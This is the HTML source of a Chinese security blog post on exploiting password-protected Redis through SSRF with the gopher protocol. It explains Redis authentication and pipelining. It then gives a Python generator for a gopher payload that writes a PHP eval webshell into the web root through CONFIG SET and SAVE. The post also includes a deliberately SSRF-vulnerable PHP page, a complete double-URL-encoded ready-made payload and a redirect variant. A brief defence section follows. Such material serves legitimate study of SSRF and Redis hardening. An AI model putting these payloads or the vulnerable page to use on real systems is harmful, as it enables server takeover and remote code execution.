@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="redis,ssrf," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="ssrf+gopher+redis getshell分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssrf + auth redis">
+<meta property="og:url" content="http://yoursite.com/2020/06/14/redis2/index.html">
+<meta property="og:site_name" content="0pa9ue">
+<meta property="og:description" content="ssrf+gopher+redis getshell分析">
+<meta property="og:image" content="http://yoursite.com/2020/06/14/redis2/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/06/14/redis2/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/06/14/redis2/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/06/14/redis2/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/06/14/redis2/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/06/14/redis2/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/06/14/redis2/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/06/14/redis2/11.png">
+<meta property="og:image" content="http://yoursite.com/2020/06/14/redis2/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/06/14/redis2/10.png">
+<meta property="og:image" content="http://yoursite.com/2020/06/14/redis2/9.png">
+<meta property="article:published_time" content="2020-06-14T08:08:53.000Z">
+<meta property="article:modified_time" content="2020-06-15T08:10:51.361Z">
+<meta property="article:author" content="0pa9ue">
+<meta property="article:tag" content="redis">
+<meta property="article:tag" content="ssrf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/06/14/redis2/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/06/14/redis2/"/>
+
+
+
+
+
+  <title>ssrf + auth redis | 0pa9ue</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0pa9ue</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/14/redis2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0pa9ue">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0pa9ue">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ssrf + auth redis</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-06-14T16:08:53+08:00">
+                2020-06-14
+              </time>
+            
+
+            
+
+            
+
+            
+          </span>
+
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  9
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>ssrf+gopher+redis getshell分析</p>
+<a id="more"></a>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在<a href="http://www.0pa9ue.top/2020/05/25/redis/#more" target="_blank" rel="noopener">上篇文章中</a>我们分析了redis getshell以及rce的几个基本方法，这次我们结合ssrf进行复现和利用<br>上回我们实验的前提是redis的未授权，那么防御的措施当然是对redis进行权限的配置，那么给redis配置密码就没有后患了吗？<br>答案是否定的，结合ssrf我们可以对带认证的redis进行攻击。<br>首先我们来看一下redis是如何认证身份的</p>
+<h2 id="redis认证"><a href="#redis认证" class="headerlink" title="redis认证"></a>redis认证</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 暂时设置redis密码</span></span><br><span class="line">config <span class="built_in">set</span> requirepass 123456</span><br></pre></td></tr></table></figure>
+<p>如果需要永久配置密码，则需要在redis.conf配置文件中设置好requirepass字段</p>
+<h3 id="认证过程"><a href="#认证过程" class="headerlink" title="认证过程"></a>认证过程</h3><p>通过wireshark抓包来发掘redis的认证过程<br><img src="/2020/06/14/redis2/1.png" alt></p>
+<p>可以看到，redis的认证通信格式与普通的命令格式是一致的，都为RESP协议格式</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*2\r\n<span class="variable">$4</span>\r\nAUTH<span class="variable">$6</span>\r\n0pa9ue\r\n</span><br></pre></td></tr></table></figure>
+
+<p>所以我们只需要在payload前添加%2A2%0d%0a%244%0d%0aAUTH%0d%0a%246%0d%0a0pa9ue%0D%0A，也就是urlencode(*2\r\n$4\r\nAUTH$6\r\n0pa9ue\r\n)即可</p>
+<h2 id="redis管道"><a href="#redis管道" class="headerlink" title="redis管道"></a>redis管道</h2><p>这个机制十分关键，决定了Redis在认证情况下是否依然能被攻击的原因</p>
+<p><a href="https://redis.io/topics/protocol" target="_blank" rel="noopener">redis官方文档</a>中有这样的描述</p>
+<blockquote>
+<p>Request-Response model.<br>A client can use the same connection in order to issue multiple commands. Pipelining is supported so multiple commands can be sent with a single write operation by the client, without the need to read the server reply of the previous command before issuing the next one. All the replies can be read at the end.</p>
+</blockquote>
+<p>大致意思是说Redis客户端支持管道操作，可以通过单个写入操作发送多个命令，而无需在发出下一个命令之前读取上一个命令的服务器回复，所有的回复都可以在最后读取<br>那么我们就可以在payload前带上认证信息，redis在接收到一连串信息后，会依次进行处理，最后再将每一条语句的处理结果都返回给客户端</p>
+<h2 id="ssrf-auth-redis"><a href="#ssrf-auth-redis" class="headerlink" title="ssrf+auth redis"></a>ssrf+auth redis</h2><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><p>gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。允许用户使用层叠结构的菜单与文件，以发现和检索信息，它拥有世界上最大、最神奇的编目</p>
+<p>gopher协议格式</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_接TCP数据流</span><br></pre></td></tr></table></figure>
+<p>值得一提的是，上面的_可以理解为<gopher-path>和TCP数据流之间的分隔的，而且这个字符不一定是下划线（下划线只是因为好区别数据之间的分隔），只要是任意一个字符都可以</gopher-path></p>
+<p>gopher例子</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://47.xxx.xxx.xxx:80/_GET%20/%20HTTP/1.1%0d%0AHost:%2047.xxx.xxx.xxx%0d%0A</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/14/redis2/2.png" alt></p>
+<p>那么，为什么我们总是提到ssrf，curl等就想到gopher呢？</p>
+<p>我认为其中的几个原因是：</p>
+<ul>
+<li>虽然gopher现在使用的地方不多，但是基本上各种curl库都实现了gopher协议</li>
+<li>gopher发送的是TCP数据流，意味着可以实现很多请求方法</li>
+<li>http在url中是不允许有\r\n的（因为http协议也是以\r\n作为每一行的分隔符），而在gopher协议中则没有那么严格的规定，并且gopher协议可在url中带上TCP数据流，所以说在TCP数据流是可以存在\r\n的</li>
+</ul>
+<p>当然，针对于<strong>http在url中是不允许有\r\n这个前提</strong>，不排除在某些版本和实现的curl库中，存在一些解析问题，导致能够将某些特殊字符解析成\r\n，导致clrf注入漏洞<br>参考<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">2017年Black hat的议题</a></p>
+<p>比如以下这个使用curl来执行redis命令的例子：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -v opher://127.0.0.1:6379/_get</span><br><span class="line">get a</span><br><span class="line"><span class="built_in">set</span> a b</span><br><span class="line">get a</span><br><span class="line"><span class="comment"># gopher编码后（将\r\n进行urlencode—&gt;%0d%0a）</span></span><br><span class="line">curl -v gopher://127.0.0.1:6379/_get%20a%0d%0aset%20a%20b%0d%0aget%20a</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/06/14/redis2/3.png" alt></p>
+<p>而使用http的话，基本尝试都不能成功（在下面还会对这个点进行一下研究）。原因基本上都是因为不能插入\r\n而导致redis命令执行错误</p>
+<p><img src="/2020/06/14/redis2/4.png" alt></p>
+<h3 id="php-libcurl"><a href="#php-libcurl" class="headerlink" title="php libcurl"></a>php libcurl</h3><p><a href="https://www.php.net/manual/en/intro.curl.php" target="_blank" rel="noopener">简介</a></p>
+<p>使用curl_version()查看当前使用curl的版本号以及支持的一些协议<br><img src="/2020/06/14/redis2/5.png" alt></p>
+<p>所以使用curl中的扩展——gopher协议进行getshell</p>
+<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>使用七友师傅的<a href="https://xz.aliyun.com/t/5665#toc-12" target="_blank" rel="noopener">gopher脚本</a>生成payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用redis备份文件进行getshell</span></span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"127.0.0.1"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n0pa9ue\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"0pa9ue.php"</span></span><br><span class="line">path=<span class="string">"/Users/zww/Desktop/"</span></span><br><span class="line">passwd=<span class="string">"123456"</span> <span class="comment"># 带弱密码认证的redis payload</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line"></span><br><span class="line">payload=protocol + ip + <span class="string">":"</span> + port + <span class="string">"/_"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF = <span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd = <span class="string">""</span></span><br><span class="line">    cmd += <span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF + <span class="string">"$"</span> + str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)))) + CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    ssrf = urllib.quote(payload)</span><br><span class="line">    <span class="keyword">print</span> payload</span><br><span class="line">    <span class="keyword">print</span> ssrf</span><br></pre></td></tr></table></figure>
+
+<p>存在ssrf漏洞的测试页面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line">var_dump($url);</span><br><span class="line"></span><br><span class="line">$ch = curl_init();<span class="comment">//初始化curl模块</span></span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);<span class="comment">//登录提交的地址</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">1</span>);<span class="comment">//是否显示头信息</span></span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">//是否自动显示返回的信息</span></span><br><span class="line"><span class="comment">//若给定url自动跳转到新的url,有了下面参数可自动获取新url内容：302跳转</span></span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//设置cURL允许执行的最长秒数。</span></span><br><span class="line">curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">10</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_USERAGENT, <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0'</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_REFERER, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_ENCODING, <span class="string">'gzip, deflate'</span>);</span><br><span class="line"></span><br><span class="line">$content = curl_exec($ch);<span class="comment">//执行cURL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取请求返回码，请求成功返回200</span></span><br><span class="line">$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"status code: "</span> . $code . <span class="string">"\n\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;var_dump($content);<span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line"></span><br><span class="line">curl_close($ch);<span class="comment">//关闭cURL资源，并且释放系统资源</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里url要使用两次编码的原因是因为获取到的$url会进行一次urldecode，接着再使用这个urldecode后的值在进行curl访问</p>
+<p>如果说只进行一次urlencode的话，则会出现下面这样的情况<br>gopher://127.0.0.1:6379/_get%20a%0d%0aset%20a%20b%0d%0aget%20a<br><img src="/2020/06/14/redis2/6.png" alt><br>因为url解析的问题，而导致无法进行curl访问，所以需要对payload进行二次编码</p>
+<p>payload：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//127.0.0.1%3A6379/_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252439%250D%250A%250A%250A0pa9ue%250A%250A%253C%253Fphp%2520eval%2528%2524_GET%255B%2522cmd%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252419%250D%250A/var/www/html/%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252410%250D%250A0pa9ue.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span><br></pre></td></tr></table></figure>
+
+<p>结合ssrf进行利用，成功打通后会生成一个0pa9ue.php的文件</p>
+<p><img src="/2020/06/14/redis2/7.png" alt></p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p><del>redis只允许内网访问</del> -&gt; ssrf可破<br><del>弱密码权限配置</del> -&gt; 带认证的ssrf</p>
+<p>既然是redis未授权访问导致的rce，那么给redis进行权限配置是很有必要的<br>使用强密码，检查是否存在ssrf</p>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>刚开始想的是为什么一提到ssrf + redis就想到gopher + getshell，就没有别的新的姿势吗？于是想将同样的思路使用在http协议上</p>
+<h3 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h3><p>使用header进行跳转</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location:gopher://127.0.0.1:6379/_get%20a%0d%0aset%20a%20b%0d%0aget%20a"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/14/redis2/11.png" alt></p>
+<h3 id="探索"><a href="#探索" class="headerlink" title="探索"></a>探索</h3><p>经过了一番探索后发现，<br>使用http get：<br><img src="/2020/06/14/redis2/8.png" alt><br>可以发现，redis将http get请求包中的GET作为了命令中获取value的get方法<br>虽然说redis是以空格作为参数之间的分隔符，但是因为redis get只需要一个参数，也就是key值，所以http get请求包的第一行中”三个参数”无法满足redis get命令的语法，而导致报错（”-ERR wrong number of arguments for ‘get’ command”）</p>
+<p>使用http post：<br>实际上，在老版本的redis(&lt; 3.2.7)中，这样是可以利用的<br>使用这样的攻击方式叫做Cross Protocol Scripting漏洞<br><a href="https://segmentfault.com/a/1190000008237858" target="_blank" rel="noopener">漏洞利用</a>       <a href="https://github.com/dxa4481/whatsinmyredis" target="_blank" rel="noopener">POC</a><br><img src="/2020/06/14/redis2/10.png" alt></p>
+<p>使用curl自定义请求头：<br>使用-X参数可以自定义http的请求方法，此时通过http协议也可以进行set命令的，但是与get方法所遇到的问题是类似的（需要截断以及绕过/），来任意设置键值对<br><img src="/2020/06/14/redis2/9.png" alt></p>
+<p>综上，如果想要利用的话，我认为有两个条件：</p>
+<ul>
+<li>能够截断 HTTP/1.1 协议号字段</li>
+<li>如果上面的条件满足了，我们也需要将/进行某种方式的绕过，这样才可以使用get来获取任意键值对</li>
+</ul>
+<p>感觉最后的问题还是回到了clrf注入以及curl库的漏洞上了<br>不知道以后会不会有这样的漏洞，这里就当挖个坑了？</p>
+<p>最后最后，还有大佬新鲜出炉的对redis的探索，这里记录一下 <a href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&mid=2247484020&idx=1&sn=06db219408f093c65d252c506ad502df&chksm=e92f16d7de589fc1df6fea9ebba21db9e8f8e76a0db89887b6eb9fa6f07f8c61d34977a6405c&mpshare=1&scene=23&srcid&sharer_sharetime=1591352311515&sharer_shareid=edfac7bd677646ff691b8c20fd81f149%23rd" target="_blank" rel="noopener">传送门</a></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>带redis认证的ssrf</p>
+<ul>
+<li><a href="https://www.anquanke.com/post/id/181599" target="_blank" rel="noopener">https://www.anquanke.com/post/id/181599</a><br>ssrf </li>
+<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a><br>clrf</li>
+<li><a href="https://medium.com/@tomnomnom/crlf-injection-into-phps-curl-options-e2e0d7cfe545" target="_blank" rel="noopener">https://medium.com/@tomnomnom/crlf-injection-into-phps-curl-options-e2e0d7cfe545</a><br>Cross Protocol Scripting漏洞</li>
+<li><a href="https://segmentfault.com/a/1190000008237858" target="_blank" rel="noopener">https://segmentfault.com/a/1190000008237858</a></li>
+<li><a href="https://github.com/dxa4481/whatsinmyredis" target="_blank" rel="noopener">https://github.com/dxa4481/whatsinmyredis</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/redis/" rel="tag"># redis</a>
+          
+            <a href="/tags/ssrf/" rel="tag"># ssrf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/25/redis/" rel="next" title="redis RCE">
+                <i class="fa fa-chevron-left"></i> redis RCE
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">0pa9ue</p>
+              <p class="site-description motion-element" itemprop="description">stay hungry, stay foolish</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#redis认证"><span class="nav-number">2.</span> <span class="nav-text">redis认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#配置"><span class="nav-number">2.1.</span> <span class="nav-text">配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#认证过程"><span class="nav-number">2.2.</span> <span class="nav-text">认证过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#redis管道"><span class="nav-number">3.</span> <span class="nav-text">redis管道</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssrf-auth-redis"><span class="nav-number">4.</span> <span class="nav-text">ssrf+auth redis</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#gopher"><span class="nav-number">4.1.</span> <span class="nav-text">gopher</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-libcurl"><span class="nav-number">4.2.</span> <span class="nav-text">php libcurl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验"><span class="nav-number">4.3.</span> <span class="nav-text">实验</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御"><span 